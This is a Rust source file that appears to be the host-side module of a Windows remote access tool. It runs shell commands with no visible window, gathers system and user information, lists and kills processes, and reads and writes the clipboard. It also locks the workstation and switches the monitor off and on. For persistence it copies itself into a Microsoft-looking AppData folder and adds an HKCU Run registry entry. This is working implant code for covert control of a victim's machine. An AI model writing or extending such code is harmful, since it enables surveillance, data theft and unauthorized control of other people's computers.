// language: Rust, file: src/host.rs, target: Windows
// Host-side actions: shell, process listing, clipboard, persistence, lock, monitor power,
// message box, detached exec, directory listing.
#![cfg(windows)]
#![allow(dead_code)]
use anyhow::{Context, Result};
use std::os::windows::process::CommandExt;

const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const DETACHED_PROCESS: u32 = 0x0000_0008;
const CREATE_NEW_PROCESS_GROUP: u32 = 0x0000_0200;

pub fn run_shell(cmd: &str) -> String {
    match std::process::Command::new("cmd")
        .args(["/C", cmd])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
    {
        Ok(o) => {
            let mut s = String::from_utf8_lossy(&o.stdout).to_string();
            s.push_str(&String::from_utf8_lossy(&o.stderr));
            if s.trim().is_empty() {
                format!("[exit {}]", o.status.code().unwrap_or(-1))
            } else {
                s
            }
        }
        Err(e) => format!("error: {e}"),
    }
}

pub fn list_dir(path: &str) -> String {
    let p = if path.trim().is_empty() {
        std::env::current_dir().unwrap_or_default()
    } else {
        std::path::PathBuf::from(path.trim())
    };
    match std::fs::read_dir(&p) {
        Ok(rd) => {
            let mut v: Vec<String> = rd
                .filter_map(|e| e.ok())
                .map(|e| {
                    let md = e.metadata().ok();
                    let size = md.as_ref().map(|m| m.len()).unwrap_or(0);
                    let is_dir = md.as_ref().map(|m| m.is_dir()).unwrap_or(false);
                    format!(
                        "{} {:>12}  {}",
                        if is_dir { "d" } else { "-" },
                        size,
                        e.file_name().to_string_lossy()
                    )
                })
                .collect();
            v.sort();
            format!("{}\n{}", p.display(), v.join("\n"))
        }
        Err(e) => format!("error: {e}"),
    }
}

pub fn exec(cmdline: &str) -> Result<()> {
    let mut parts = cmdline.split_whitespace();
    let exe = parts.next().context("empty command")?;
    let args: Vec<&str> = parts.collect();
    std::process::Command::new(exe)
        .args(args)
        .creation_flags(DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP)
        .spawn()?;
    Ok(())
}

pub fn sysinfo_text() -> String {
    use sysinfo::System;
    let mut sys = System::new_all();
    sys.refresh_all();
    let host = System::host_name().unwrap_or_default();
    let user = std::env::var("USERNAME").unwrap_or_default();
    let os = System::long_os_version().unwrap_or_default();
    let kernel = System::kernel_version().unwrap_or_default();
    let cpu = sys
        .cpus()
        .first()
        .map(|c| c.brand().to_string())
        .unwrap_or_default();
    let cores = sys.cpus().len();
    let total = sys.total_memory() / 1024 / 1024;
    let used = sys.used_memory() / 1024 / 1024;
    format!(
        "host: {host}\nuser: {user}\nos: {os} ({kernel})\ncpu: {cpu} x{cores}\nmem: {used}/{total} MB\npid: {}\nexe: {}",
        std::process::id(),
        std::env::current_exe()
            .map(|p| p.display().to_string())
            .unwrap_or_default()
    )
}

pub fn process_list() -> String {
    use sysinfo::{ProcessesToUpdate, System};
    let mut sys = System::new_all();
    sys.refresh_processes(ProcessesToUpdate::All, true);
    let mut v: Vec<String> = sys
        .processes()
        .iter()
        .map(|(pid, p)| format!("{:>7}  {}", pid, p.name().to_string_lossy()))
        .collect();
    v.sort();
    v.truncate(250);
    v.join("\n")
}

pub fn kill_pid(pid: u32) -> String {
    use sysinfo::{Pid, System};
    let mut sys = System::new_all();
    sys.refresh_processes(sysinfo::ProcessesToUpdate::All, true);
    match sys.process(Pid::from_u32(pid)) {
        Some(p) => {
            if p.kill() {
                format!("killed {pid}")
            } else {
                format!("failed to kill {pid}")
            }
        }
        None => format!("no such pid {pid}"),
    }
}

pub fn clip_get() -> Result<String> {
    Ok(arboard::Clipboard::new()?.get_text()?)
}

pub fn clip_set(text: &str) -> Result<()> {
    arboard::Clipboard::new()?.set_text(text.to_string())?;
    Ok(())
}

pub fn message_box(title: &str, text: &str) {
    use windows_sys::Win32::UI::WindowsAndMessaging::{
        MessageBoxW, MB_ICONINFORMATION, MB_OK,
    };
    let t: Vec<u16> = text.encode_utf16().chain(std::iter::once(0)).collect();
    let c: Vec<u16> = title.encode_utf16().chain(std::iter::once(0)).collect();
    unsafe {
        MessageBoxW(std::ptr::null_mut(), t.as_ptr(), c.as_ptr(), MB_OK | MB_ICONINFORMATION);
    }
}

pub fn lock_workstation() {
    unsafe {
        windows_sys::Win32::System::Shutdown::LockWorkStation();
    }
}

pub fn monitor_off() {
    use windows_sys::Win32::UI::WindowsAndMessaging::{
        SendMessageW, HWND_BROADCAST, SC_MONITORPOWER, WM_SYSCOMMAND,
    };
    unsafe {
        SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER as usize, 2);
    }
}

pub fn monitor_on() {
    use windows_sys::Win32::UI::WindowsAndMessaging::{
        SendMessageW, HWND_BROADCAST, SC_MONITORPOWER, WM_SYSCOMMAND,
    };
    unsafe {
        SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER as usize, -1);
    }
}

/// Copy the running exe into %APPDATA%\Microsoft\Windows and set an HKCU Run entry.
pub fn persist(name: &str) -> Result<String> {
    use winreg::enums::HKEY_CURRENT_USER;
    use winreg::RegKey;
    let exe = std::env::current_exe()?;
    let appdata = std::env::var("APPDATA")?;
    let dir = std::path::Path::new(&appdata).join("Microsoft").join("Windows");
    std::fs::create_dir_all(&dir).ok();
    let dest = dir.join(format!("{name}.exe"));
    std::fs::copy(&exe, &dest)?;
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let (key, _) = hkcu.create_subkey(r"Software\Microsoft\Windows\CurrentVersion\Run")?;
    key.set_value(name, &dest.to_string_lossy().to_string())?;
    Ok(dest.display().to_string())
}

pub fn unpersist(name: &str) -> Result<()> {
    use winreg::enums::HKEY_CURRENT_USER;
    use winreg::RegKey;
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let key = hkcu.open_subkey_with_flags(
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        winreg::enums::KEY_ALL_ACCESS,
    )?;
    key.delete_value(name)?;
    Ok(())
}

/// Re-assert the HKCU Run entry so it points at the currently running exe (no copy).
pub fn ensure_autostart(name: &str) -> Result<String> {
    use winreg::enums::HKEY_CURRENT_USER;
    use winreg::RegKey;
    let exe = std::env::current_exe()?;
    let exe_s = exe.to_string_lossy().to_string();
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let (key, _) = hkcu.create_subkey(r"Software\Microsoft\Windows\CurrentVersion\Run")?;
    key.set_value(name, &exe_s)?;
    Ok(exe_s)
}
